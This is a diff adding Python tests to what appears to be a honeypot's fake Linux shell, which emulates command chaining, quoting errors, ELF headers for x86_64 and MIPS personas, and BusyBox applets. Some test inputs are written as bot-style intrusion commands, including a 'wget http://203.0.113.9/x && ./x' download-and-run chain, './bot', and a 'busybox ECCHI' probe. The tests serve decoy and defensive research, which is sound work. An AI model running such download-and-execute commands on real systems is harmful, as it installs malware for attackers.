@@ -396,3 +396,109 @@ def test_banner_last_login_is_not_a_fixed_placeholder():
 
     assert "from unknown" not in banner
     assert "Last login: " in banner
+
+
+def test_commands_on_one_line_run_in_order_and_log_once():
+    engine = InteractionEngine()
+    session = create_session()
+    prompt = session.prompt()
+
+    response = engine.process("echo OK; whoami", session)
+
+    assert response == f"OK\nroot\n{prompt}"
+    assert [c["cmd"] for c in session.commands] == ["echo OK; whoami"]
+
+
+def test_and_or_run_the_next_command_only_on_success_or_failure():
+    engine = InteractionEngine()
+    session = create_session()
+
+    # The prompt shows the directory, so read it after the cd
+    response = engine.process("cd /bin && pwd", session)
+    assert response == f"/bin\n{session.prompt()}"
+    prompt = session.prompt()
+    assert engine.process("cd /nope && pwd", session) == (
+        f"bash: cd: /nope: No such file or directory\n{prompt}"
+    )
+    assert engine.process("cd /nope || echo fallback", session).endswith(f"fallback\n{prompt}")
+    assert engine.process("echo a || echo b", session) == f"a\n{prompt}"
+    # A failed download stops a `wget ... && chmod +x ...` chain
+    response = engine.process("wget http://203.0.113.9/x && ./x", session)
+    assert "unable to resolve host" in response
+    assert "./x" not in response
+
+
+def test_separators_inside_quotes_are_text():
+    engine = InteractionEngine()
+    session = create_session()
+    prompt = session.prompt()
+
+    assert engine.process('echo "a; b && c"', session) == f"a; b && c\n{prompt}"
+    assert engine.process(r"echo a\;b", session) == f"a;b\n{prompt}"
+
+
+def test_a_separator_with_no_command_is_a_syntax_error():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert "syntax error near unexpected token `;'" in engine.process("; ls", session)
+    assert "syntax error near unexpected token `;;'" in engine.process("echo a;;", session)
+    assert engine.process("echo a;", session) == f"a\n{session.prompt()}"
+
+
+def test_exit_after_output_keeps_the_output_and_closes():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert engine.process("echo bye; exit; whoami", session) == "bye\n__CLOSE__"
+
+
+def test_cat_of_a_system_program_prints_a_header_for_the_persona_cpu():
+    """A loader reads bytes 4, 5 and 18 to pick the build to download."""
+    engine = InteractionEngine()
+    session = create_session()
+
+    header = engine.process("cat /bin/echo", session).removesuffix(session.prompt())
+
+    assert header[:4] == "\x7fELF"
+    assert header[4] == "\x02"  # 64-bit
+    assert header[5] == "\x01"  # little-endian
+    assert header[18] == "\x3e"  # x86_64
+    assert all(ord(char) < 0x80 for char in header)
+    assert engine.process("cat /usr/bin/echo", session).startswith("\x7fELF")
+
+
+def test_cat_of_a_system_program_on_a_mips_router_says_mips():
+    engine = InteractionEngine()
+    session = SessionState(("127.0.0.1", 4444), persona=get_persona("busybox_router"))
+
+    header = engine.process("/bin/busybox cat /bin/echo", session)
+
+    assert header[:4] == "\x7fELF"
+    assert header[4] == "\x01"  # 32-bit
+    assert header[5] == "\x02"  # big-endian
+    assert header[19] == "\x08"  # MIPS, high byte first
+
+
+def test_programs_by_full_path_and_busybox_applets():
+    engine = InteractionEngine()
+    router = SessionState(("127.0.0.1", 4444), persona=get_persona("busybox_router"))
+    server = create_session()
+
+    assert engine.process("/usr/bin/whoami", server).startswith("root\n")
+    assert engine.process("/bin/busybox echo hi", server).startswith(
+        "bash: /bin/busybox: No such file or directory"
+    )
+    assert engine.process("./bot", server).startswith("bash: ./bot: No such file or directory")
+    assert engine.process("busybox ECCHI", router).startswith("ECCHI: applet not found")
+    assert engine.process("busybox echo hi", router).startswith("hi\n")
+
+
+def test_bin_directories_list_the_programs():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert "echo" in engine.process("ls /bin", session)
+    assert "usr" in engine.process("ls /", session)
+    assert "cat: /usr/bin: Is a directory" in engine.process("cat /usr/bin", session)
+    assert "Not a directory" in engine.process("cd /bin/echo", session)
